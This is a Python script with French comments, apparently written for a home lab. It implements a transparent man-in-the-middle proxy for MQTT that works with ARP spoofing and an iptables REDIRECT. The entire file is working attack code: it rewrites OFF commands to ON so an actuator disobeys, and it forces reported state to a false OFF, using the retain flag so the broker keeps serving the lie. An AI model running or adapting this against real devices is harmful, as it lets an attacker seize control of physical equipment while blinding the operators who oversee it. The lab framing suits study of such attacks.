#!/usr/bin/env python3
"""
proxy.py — Proxy TCP transparent MITM pour MQTT.

Termine la connexion de l'actionneur (.223) détournée par REDIRECT, ouvre sa
propre connexion vers le vrai broker (.182), et relaie le flux dans les deux sens
en découpant proprement les messages MQTT. Altère :
  - commande (broker -> actionneur) : OFF -> ON        (la LED désobéit)
  - etat     (actionneur -> broker) : figé à OFF       (la supervision est aveuglée)

Points clés :
  - On TERMINE les connexions TCP : chaque pile gère ses propres numéros de
    séquence, donc on peut changer la longueur du payload (ON=2, OFF=3) librement.
  - TCP est un flux d'octets SANS frontières de message : on bufferise par
    connexion et on découpe les messages MQTT via leur champ 'remaining length'.
    On réémet TOUJOURS l'intégralité (messages altérés ou non), pour ne jamais
    perdre d'octets ni désynchroniser le flux.

Prérequis (en parallèle) :
  - spoof.py qui tourne, ciblant .223 <-> .182
  - net.ipv4.ip_forward=1
  - règle REDIRECT : trafic .223 -> .182:1883 redirigé vers le port local 8888
Usage : sudo ./venv/bin/python3 proxy.py
Arrêt : Ctrl+C
Cadre : laboratoire isolé dont je suis propriétaire (usage pédagogique).
"""
import socket
import struct
import threading

LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = 8888
SO_ORIGINAL_DST = 80            # constante Linux non exposée par le module socket

TOPIC_CMD  = b"labo/actionneur/commande"   # broker -> actionneur ; OFF -> ON
TOPIC_ETAT = b"labo/actionneur/etat"       # actionneur -> broker ; figé à OFF

# --- Encodage / décodage de la 'remaining length' MQTT -----------------------
def encode_remaining_length(n: int) -> bytes:
    """Encode la 'remaining length' MQTT (varint 7 bits, bit de poids fort = suite)."""
    out = bytearray()
    while True:
        byte = n % 128
        n //= 128
        if n > 0:
            byte |= 0x80
        out.append(byte)
        if n == 0:
            break
    return bytes(out)

def decode_remaining_length(buf: bytes, offset: int):
    """
    Lit la 'remaining length' à partir de buf[offset].
    Retourne (valeur, nb_octets_lus), ou (None, 0) si le varint est incomplet.
    """
    multiplier = 1
    value = 0
    bytes_read = 0
    for i in range(offset, min(offset + 4, len(buf))):
        byte = buf[i]
        value += (byte & 0x7F) * multiplier
        bytes_read += 1
        if (byte & 0x80) == 0:
            return value, bytes_read
        multiplier *= 128
    return None, 0

# --- Découpage du flux en messages MQTT complets -----------------------------
def split_mqtt(buffer: bytes):
    """
    Découpe un buffer d'octets en messages MQTT complets.
    Retourne (liste_de_messages_complets, reste_incomplet_a_conserver).
    """
    messages = []
    i = 0
    while i < len(buffer):
        if len(buffer) - i < 2:
            break  # pas même l'octet de type + le premier octet de longueur
        rem_len, rl_bytes = decode_remaining_length(buffer, i + 1)
        if rem_len is None:
            break  # 'remaining length' incomplète -> attendre plus d'octets
        total = 1 + rl_bytes + rem_len
        if len(buffer) - i < total:
            break  # message pas encore entièrement arrivé -> attendre
        messages.append(buffer[i:i + total])
        i += total
    return messages, buffer[i:]

# --- Altérations applicatives ------------------------------------------------
def transform_one(msg: bytes, topic: bytes, want: bytes, new: bytes, label: str) -> bytes:
    """
    Si msg est un PUBLISH sur 'topic' dont le payload vaut exactement 'want',
    renvoie un PUBLISH équivalent avec le payload 'new' (flag retain conservé).
    Sinon renvoie msg inchangé. Sert à la COMMANDE (OFF -> ON).
    """
    if msg[:1] in (b"\x30", b"\x31") and topic in msg:
        idx = msg.find(topic)
        payload = msg[idx + len(topic):]
        if payload == want:
            variable = struct.pack("!H", len(topic)) + topic + new
            remaining = encode_remaining_length(len(variable))
            retain = msg[0] & 0x01
            header = bytes([0x30 | retain])
            new_pkt = header + remaining + variable
            print(f"[ALTÉRÉ] {label} ({want.decode()} -> {new.decode()})", flush=True)
            return new_pkt
    return msg

def force_etat(msg: bytes, topic: bytes, forced: bytes) -> bytes:
    """
    Force TOUT PUBLISH d'état sur 'topic' à 'forced', quelle que soit la vraie
    valeur publiée par l'objet. Sert à l'ÉTAT (figé à OFF). Le flag retain est
    conservé : le broker mémorise le mensonge et le sert à tout nouvel abonné.
    """
    if msg[:1] in (b"\x30", b"\x31") and topic in msg:
        idx = msg.find(topic)
        payload = msg[idx + len(topic):]
        if payload != forced:   # on n'agit (et ne logge) que si la vraie valeur diffère
            variable = struct.pack("!H", len(topic)) + topic + forced
            remaining = encode_remaining_length(len(variable))
            retain = msg[0] & 0x01
            header = bytes([0x30 | retain])
            new_pkt = header + remaining + variable
            print(f"[FIGÉ] etat {payload.decode(errors='replace')} -> {forced.decode()}",
                  flush=True)
            return new_pkt
    return msg

# --- Plomberie du proxy transparent ------------------------------------------
def get_original_dst(conn: socket.socket):
    """Récupère la destination d'origine (le vrai broker) avant le REDIRECT."""
    raw = conn.getsockopt(socket.SOL_IP, SO_ORIGINAL_DST, 16)
    port = struct.unpack("!H", raw[2:4])[0]
    ip = socket.inet_ntoa(raw[4:8])
    return ip, port

def pipe(src: socket.socket, dst: socket.socket, direction: str):
    """
    Relaie src -> dst en découpant proprement les messages MQTT.
    direction : 'broker2dev' (altère la commande) ou 'dev2broker' (fige l'etat).
    Un buffer par connexion gère coalescence et fragmentation.
    """
    buffer = b""
    try:
        while True:
            chunk = src.recv(4096)
            if not chunk:
                break
            buffer += chunk
            messages, buffer = split_mqtt(buffer)   # le reste incomplet est conservé
            out = b""
            for msg in messages:
                if direction == "broker2dev":
                    msg = transform_one(msg, TOPIC_CMD, b"OFF", b"ON", "commande")
                elif direction == "dev2broker":
                    msg = force_etat(msg, TOPIC_ETAT, b"OFF")
                out += msg                           # on réémet TOUT, altéré ou non
            if out:
                dst.sendall(out)
    except OSError:
        pass
    finally:
        for s in (src, dst):
            try:
                s.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass

def handle_client(device_conn: socket.socket, device_addr):
    # 1) Destination d'origine (le vrai broker), mémorisée par le noyau avant REDIRECT
    try:
        orig_ip, orig_port = get_original_dst(device_conn)
    except OSError as e:
        print(f"[!] SO_ORIGINAL_DST échec pour {device_addr}: {e}", flush=True)
        device_conn.close()
        return
    print(f"[+] {device_addr} voulait joindre {orig_ip}:{orig_port} -> on relaie", flush=True)

    # 2) Notre propre connexion vers le vrai broker
    broker_conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        broker_conn.connect((orig_ip, orig_port))
    except OSError as e:
        print(f"[!] connexion au broker {orig_ip}:{orig_port} impossible: {e}", flush=True)
        device_conn.close()
        return

    # 3) Deux threads de relais, un par sens
    t1 = threading.Thread(target=pipe, args=(device_conn, broker_conn, "dev2broker"),
                          daemon=True)
    t2 = threading.Thread(target=pipe, args=(broker_conn, device_conn, "broker2dev"),
                          daemon=True)
    t1.start(); t2.start()
    t1.join(); t2.join()
    print(f"[-] session {device_addr} terminée", flush=True)

def main():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((LISTEN_HOST, LISTEN_PORT))
    srv.listen(16)
    print(f"[*] Proxy transparent à l'écoute sur {LISTEN_HOST}:{LISTEN_PORT}")
    print(f"[*] commande {TOPIC_CMD.decode()} : OFF -> ON")
    print(f"[*] etat     {TOPIC_ETAT.decode()} : figé à OFF")
    print("[*] Ctrl+C pour arrêter.")
    try:
        while True:
            conn, addr = srv.accept()
            threading.Thread(target=handle_client, args=(conn, addr), daemon=True).start()
    except KeyboardInterrupt:
        print("\n[*] Arrêt du proxy.")
    finally:
        srv.close()

if __name__ == "__main__":
    main()